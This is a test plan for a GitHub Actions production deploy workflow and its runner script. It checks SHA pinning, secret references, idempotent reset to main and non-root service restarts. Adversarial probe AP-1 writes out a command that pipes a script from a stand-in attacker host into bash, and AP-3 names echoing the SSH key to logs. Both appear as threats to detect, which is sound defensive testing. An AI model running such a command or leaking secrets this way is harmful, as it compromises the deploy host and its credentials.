# Test Plan: DEPLOY-001 — Trigger pipeline (.github/workflows/deploy.yml + scripts/deploy-runner.sh)

**Refs**: Issue #130 (DEPLOY-001, P0). ADR-0027 §Decision.1+2 (Accepted per #130 body; current ADR file shows "Proposed" — verify status at sizing).

## Scope
- **In scope**: Static structural validation of `.github/workflows/deploy.yml`; `scripts/deploy-runner.sh` local dry-run; integration assertion that the workflow references all 3 secrets (DEPLOY_SSH_KEY, DEPLOY_HOST, DEPLOY_USER); action pinned by SHA (not tag); idempotency contract (`git reset --hard origin/main`); README documents the pipeline.
- **Out of scope**: GH Actions runtime semantics (only static YAML inspection); multi-branch deploy; self-hosted runner.

## Constraints (CRITICAL)

- **`.github/workflows/` is human-only** per CLAUDE.md §File ownership matrix + §Things agents must NEVER do. The developer cannot commit `.github/workflows/deploy.yml` directly — it must be proposed via PR and merged only with **explicit human approval**. Tester contract: validate the workflow YAML only **after** the human merges it (i.e., test runs against the merged state on `main`, not against a feature branch).
- **Repo secrets** are owner-managed (DEPLOY-002). Workflow references them by name only; values never appear in YAML.

## Test Cases

### TC-1: Workflow file exists + has correct trigger
- **Setup**: `.github/workflows/deploy.yml` merged to `main` (human-approved).
- **Steps**:
  1. `git show origin/main:.github/workflows/deploy.yml` (read merged state, not HEAD of PR).
  2. Assert YAML parses (PyYAML safe_load).
  3. Assert top-level `name:` is "Deploy to production".
  4. Assert `on.push.branches: ["main"]` (push trigger on main only).
  5. Assert `on.workflow_dispatch` (optional manual trigger).
  6. Assert NO `on.pull_request` (PRs should NOT deploy).
- **Expected**: trigger is main-only push; manual dispatch is optional but allowed.

### TC-2: Action pinned by SHA (security)
- **Setup**: same merged workflow YAML.
- **Steps**:
  1. Parse `jobs.<job_id>.steps[].uses` for Action references.
  2. For each `uses:` line, assert the version specifier is a 40-char SHA (e.g., `appleboy/scp-action@<sha>`), NOT a tag like `@v1` or `@main`.
- **Expected**: every Action reference uses `@<40-char-sha>`. Tag-pinned Actions are a supply-chain risk (per ADR-0027 §Threat model) — fail if found.

### TC-3: Secrets referenced by name (not value)
- **Setup**: same merged workflow YAML.
- **Steps**:
  1. Assert `${{ secrets.DEPLOY_SSH_KEY }}` appears in `env:` or `with:` block (per appleboy/ssh-action API).
  2. Assert `${{ secrets.DEPLOY_HOST }}` appears.
  3. Assert `${{ secrets.DEPLOY_USER }}` appears.
  4. Grep workflow YAML for any string matching `192.168.1.199` literal — FAIL if found (literal host = secret leak).
  5. Grep for any string matching `-----BEGIN OPENSSH PRIVATE KEY-----` or similar key markers — FAIL if found.
- **Expected**: 3 secret references present; no literals leaked.

### TC-4: Idempotency contract — `git reset --hard origin/main`
- **Setup**: same merged workflow YAML.
- **Steps**:
  1. Extract the `script:` or `command:` body of the SSH step.
  2. Assert the body contains `git fetch origin` AND `git reset --hard origin/main` (per ADR-0027 §Decision.5).
  3. Assert NO `git pull` (pull can fail on non-fast-forward; reset is idempotent).
- **Expected**: idempotent sync to `origin/main` HEAD.

### TC-5: Service restart via `systemctl --user`
- **Setup**: same merged workflow YAML.
- **Steps**:
  1. Assert workflow SSH step includes `systemctl --user restart atilcalc-web.service` (per ADR-0010 §systemd user-service).
  2. Assert NO `sudo systemctl` or root-requiring commands (SSH key is scoped to non-sudo user per ADR-0027 §Threat model).
- **Expected**: user-scoped restart only.

### TC-6: `scripts/deploy-runner.sh` exists + executable + bash-safe
- **Setup**: merged `scripts/deploy-runner.sh` (developer-owned file, not workflow-file).
- **Steps**:
  1. Assert file exists at `scripts/deploy-runner.sh`.
  2. Assert `os.access(path, os.X_OK)` returns True.
  3. Assert shebang is `#!/usr/bin/env bash` or `#!/bin/bash`.
  4. Run `bash -n scripts/deploy-runner.sh` (syntax check) — should exit 0.
  5. Run `shellcheck scripts/deploy-runner.sh` if available — should have 0 errors.
  6. Run `bash scripts/deploy-runner.sh --dry-run` (if `--dry-run` supported) — should print intended actions without executing.
- **Expected**: script is shellcheck-clean; dry-run mode exists for local testing.

### TC-7: README documents the deploy pipeline
- **Setup**: merged `README.md`.
- **Steps**:
  1. Grep `README.md` for section heading "Deployment" or "Deploy".
  2. Assert section explains: trigger (push to main), destination (192.168.1.199 per ADR-0010), smoke test (DEPLOY-003).
  3. Assert section mentions ADR-0027 link or reference.
- **Expected**: README is the owner-facing source of truth for how deploys work.

## Adversarial Probes

### AP-1: Malicious PR scenario
- Setup: simulate PR that modifies `.github/workflows/deploy.yml` to add `curl https://evil.example.com/x.sh | bash`.
- Expected: PR review catches it (CLAUDE.md §Process — human approval gate). Contract test runs against **merged main**, not PR — so this is a human-process check, not automated.

### AP-2: Tag-pinned Action retroactively modified
- Setup: imagine `appleboy/ssh-action@v1` is retroactively changed by the publisher to a malicious commit.
- Expected: SHA pinning prevents this (TC-2). Documented in ADR-0027 §Threat model.

### AP-3: Secrets echo'd to logs
- Setup: assert no `echo $DEPLOY_SSH_KEY` or similar in workflow YAML.
- Expected: secrets are passed via Action's `with:` parameter, never echoed.

### AP-4: Workflow runs on PR (premature deploy)
- Setup: assert `on.pull_request` is NOT set.
- Expected: deploys only on push to main, never on PR.

## Performance Concerns

- Deploy start latency: GH Action runner typically <2 min from merge to step-1 start (per ADR-0027 §Rationale).
- Total deploy time: `git pull` (~5s) + `systemctl restart` (~3s) + smoke test (~1s) = ~10s + GH queue latency.
- No performance test required — wall-clock observation by owner post-merge is sufficient.

## Regression Risk

- `.github/workflows/` change does not affect src/atilcalc/ code paths. No engine/api regression risk.
- `scripts/deploy-runner.sh` is a new file; no existing scripts to break.
- README update is additive (new section); no existing sections modified.

## Owner Gate Verification (manual checklist)

Before tester can run TC-1 through TC-7:
- [ ] Owner has generated ed25519 keypair + stored 3 secrets (DEPLOY-002 prereq)
- [ ] Owner has reviewed + approved the workflow PR (per CLAUDE.md §human-only)
- [ ] Workflow is merged to `main` (test reads from `origin/main`, not PR branch)
- [ ] `scripts/deploy-runner.sh` is merged to `main`

Tester contract tests run against **post-merge state on `main`**. If workflow not yet merged, tests are TDD-red with explanatory skip markers (per Issue #96 path (b) pattern).
